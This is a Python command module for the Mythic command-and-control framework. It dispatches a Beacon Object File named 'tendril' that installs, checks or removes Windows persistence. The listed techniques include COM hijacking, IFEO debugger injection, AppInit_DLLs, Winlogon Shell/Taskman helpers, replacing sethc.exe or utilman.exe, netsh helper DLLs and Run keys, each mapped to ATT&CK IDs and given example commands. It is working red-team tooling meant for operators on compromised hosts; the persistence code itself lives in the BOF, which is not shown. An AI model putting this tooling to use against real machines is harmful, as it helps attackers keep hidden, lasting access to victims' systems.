from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import base64
import struct
import json

# BOF module IDs - must match tendril.c enum
MODULE_IDS = {
    "com_hijack":      0,
    "ghost_task":      1,
    "registry_run":    2,
    "screensaver":     3,
    "ifeo_inject":     4,
    "appinit_dlls":    5,
    "winlogon_helper": 6,
    "accessibility":   7,
    "netsh_helper":    8,
    "userinit_mpr":    9,
}

ACTION_IDS = {"install": 0, "remove": 1, "check": 2}

MODULE_HELP = {
    "com_hijack":      "arg1=dll_path, arg2=CLSID, arg3=ThreadingModel (opt)",
    "ghost_task":      "arg1=task_name (install/check)",
    "registry_run":    "arg1=payload, arg2=value_name, arg3=HKCU|HKLM",
    "screensaver":     "arg1=scr_path, arg2=timeout_secs (opt)",
    "ifeo_inject":     "arg1=payload, arg2=target.exe, arg3=debugger|silent",
    "appinit_dlls":    "arg1=dll_path, arg2=x64|x86 (opt)",
    "winlogon_helper": "arg1=payload, arg2=Shell|Taskman, arg3=HKCU|HKLM",
    "accessibility":   "arg1=payload, arg2=sethc.exe|utilman.exe|osk.exe",
    "netsh_helper":    "arg1=dll_path, arg2=value_name",
    "userinit_mpr":    "arg1=payload",
}


def bof_pack_tendril(module: int, action: int, arg1: str, arg2: str, arg3: str) -> bytes:
    """Pack arguments for tendril.c go() - format: ssZZZ (two shorts + three wstrings)."""
    buf = struct.pack("<HH", module, action)
    for s in (arg1, arg2, arg3):
        encoded = s.encode("utf-16-le") + b"\x00\x00"
        buf += struct.pack("<I", len(encoded)) + encoded
    return buf


class TendrilArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="module",
                cli_name="Module",
                display_name="Module",
                type=ParameterType.ChooseOne,
                description="Persistence module to invoke",
                choices=list(MODULE_IDS.keys()),
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=1),
                ],
            ),
            CommandParameter(
                name="action",
                cli_name="Action",
                display_name="Action",
                type=ParameterType.ChooseOne,
                description="install, remove, or check",
                choices=["install", "remove", "check"],
                default_value="install",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=2),
                ],
            ),
            CommandParameter(
                name="arg1",
                cli_name="Arg1",
                display_name="Arg1 (payload/dll/name)",
                type=ParameterType.String,
                default_value="",
                description="Primary argument - payload path, DLL, command, or task name",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=3),
                ],
            ),
            CommandParameter(
                name="arg2",
                cli_name="Arg2",
                display_name="Arg2 (CLSID/name/target)",
                type=ParameterType.String,
                default_value="",
                description="Secondary argument - CLSID, value name, target exe",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=4),
                ],
            ),
            CommandParameter(
                name="arg3",
                cli_name="Arg3",
                display_name="Arg3 (hive/mode/timeout)",
                type=ParameterType.String,
                default_value="",
                description="Tertiary argument - hive, mode, threading model, timeout",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=5),
                ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            # CLI: tendril <module> <action> [arg1] [arg2] [arg3]
            parts = self.command_line.split()
            if len(parts) < 2:
                raise Exception("Usage: tendril <module> <action> [arg1] [arg2] [arg3]")
            self.add_arg("module", parts[0])
            self.add_arg("action", parts[1])
            self.add_arg("arg1", parts[2] if len(parts) > 2 else "")
            self.add_arg("arg2", parts[3] if len(parts) > 3 else "")
            self.add_arg("arg3", parts[4] if len(parts) > 4 else "")


class TendrilCommand(CommandBase):
    cmd = "tendril"
    needs_admin = False
    help_cmd = """tendril <module> <action> [arg1] [arg2] [arg3]

Modules:
  com_hijack      install <dll_path> <CLSID> [ThreadingModel]
  ghost_task      install <task_name>  |  check
  registry_run    install <payload> <value_name> [HKCU|HKLM]
  screensaver     install <scr_path> [timeout]
  ifeo_inject     install <payload> <target.exe> [debugger|silent]
  appinit_dlls    install <dll_path> [x64|x86]
  winlogon_helper install <payload> <Shell|Taskman> [HKCU|HKLM]
  accessibility   install <payload> <sethc.exe|utilman.exe>
  netsh_helper    install <dll_path> <value_name>
  userinit_mpr    install <payload>

Examples:
  tendril com_hijack install C:\\proxy.dll {BCDE0395-E52F-467C-8E3D-C4579291692E}
  tendril ghost_task check
  tendril registry_run install C:\\svc.exe UpdateSvc HKCU
  tendril ifeo_inject install C:\\x.exe notepad.exe silent
  tendril screensaver remove"""
    description = "Tendril persistence toolkit - install, check, or remove persistence via BOF dispatch"
    version = 1
    supported_ui_features = []
    author = "@Whispergate"
    attackmapping = [
        "T1546.015", "T1546.003", "T1053.005", "T1547.001", "T1546.002",
        "T1546.012", "T1546.010", "T1547.004", "T1546.008", "T1546.007",
        "T1037.001",
    ]
    argument_class = TendrilArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )

        module_name = taskData.args.get_arg("module")
        action_name = taskData.args.get_arg("action")
        arg1 = taskData.args.get_arg("arg1") or ""
        arg2 = taskData.args.get_arg("arg2") or ""
        arg3 = taskData.args.get_arg("arg3") or ""

        if module_name not in MODULE_IDS:
            response.Success = False
            response.Error = f"Unknown module: {module_name}. Valid: {', '.join(MODULE_IDS.keys())}"
            return response

        if action_name not in ACTION_IDS:
            response.Success = False
            response.Error = f"Unknown action: {action_name}. Valid: install, remove, check"
            return response

        module_id = MODULE_IDS[module_name]
        action_id = ACTION_IDS[action_name]

        # Find the tendril BOF in Mythic file store
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=taskData.Callback.ID,
            LimitByCallback=False,
            Filename="tendril",
        ))

        bof_file_id = None
        if file_resp.Success:
            for f in file_resp.Files:
                if f.Filename in ("tendril.x64.o", "tendril.x86.o", "tendril.o"):
                    bof_file_id = f.AgentFileId
                    break

        if not bof_file_id:
            response.Success = False
            response.Error = (
                "Tendril BOF not found in Mythic. Upload it first:\n"
                "  register_bof <tendril.x64.o>  (EmeraldStrike)\n"
                "  register_file <tendril.x64.o> (Apollo)"
            )
            return response

        # Get BOF content
        file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=bof_file_id,
        ))
        if not file_content.Success:
            response.Success = False
            response.Error = f"Failed to get BOF content: {file_content.Error}"
            return response

        # Pack arguments for tendril.c go(): ssZZZ
        packed_args = bof_pack_tendril(module_id, action_id, arg1, arg2, arg3)

        # Store packed data for the agent
        taskData.args.add_arg("bof_data", base64.b64encode(file_content.Content).decode(),
                              ParameterType.String)
        taskData.args.add_arg("bof_args", base64.b64encode(packed_args).decode(),
                              ParameterType.String)
        taskData.args.add_arg("bof_name", "tendril.x64.o", ParameterType.String)

        help_text = MODULE_HELP.get(module_name, "")
        response.DisplayParams = f"-Module {module_name} -Action {action_name}"
        if arg1:
            response.DisplayParams += f" '{arg1}'"
        if arg2:
            response.DisplayParams += f" '{arg2}'"
        if arg3:
            response.DisplayParams += f" '{arg3}'"
        response.DisplayParams += f"  [{help_text}]"

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
